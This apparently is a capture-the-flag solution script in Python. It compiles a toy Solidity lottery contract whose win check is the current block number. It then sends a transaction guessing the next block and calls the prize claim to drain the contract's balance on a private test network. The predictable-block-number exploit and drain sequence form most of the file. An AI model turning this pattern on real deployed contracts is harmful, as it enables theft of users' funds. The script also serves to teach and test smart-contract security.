from web3 import Web3
from web3.contract import ConciseContract
from web3.middleware import geth_poa_middleware
from solcx import compile_source, install_solc
install_solc("0.8.13")

w3 = Web3(Web3.HTTPProvider("http://10.50.254.254:22001", request_kwargs={'timeout': 60}))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

compiled_sol = compile_source(
   '''
pragma solidity 0.8.13;

// @dev : iHuggsy
contract KKLFLottery
{
    address public winner;

    receive()  external payable {}

    fallback() external payable {}

    function getPrizePool() public view returns (uint) 
    {
        return address(this).balance;
    }

    function allInOnAShitcoin(uint256 entry) public payable
    {
        require(msg.value == 1 ether, "You can only play 1 ether by 1 ether");
        require(block.number == entry, "You just lost money bro !");
        winner = msg.sender; // https://www.youtube.com/watch?v=1Bix44C1EzY
    }

    function claimPrizePool() public payable
    {   
        require(msg.sender == winner, "Lol ?"); // Who do you think you are ?
        (bool sent, bytes memory data) = msg.sender.call{value: getPrizePool()}("");
        require(sent, "Failed to sent Prize !");
    }
}
   ''',
   output_values=['abi', 'bin']
)


contract_id, contract_interface = compiled_sol.popitem()
addr = "0x9bfe1F44fC35dF915bf9e16E63043cdc8C371B4e"

acct = "0x3B129777f4d45152F0d4acF1cAacbbE6Ac018789"

con = w3.eth.contract(addr, abi=contract_interface['abi'])

entry = (w3.eth.get_block_number()) + 1


txn_hash = con.functions.allInOnAShitcoin(entry).transact({"from": acct, "value": 1000000000000000000 })
w3.eth.wait_for_transaction_receipt(txn_hash)

print(con.functions.winner().address)

txn_hash = con.functions.claimPrizePool().transact({"from": acct})
w3.eth.wait_for_transaction_receipt(txn_hash)

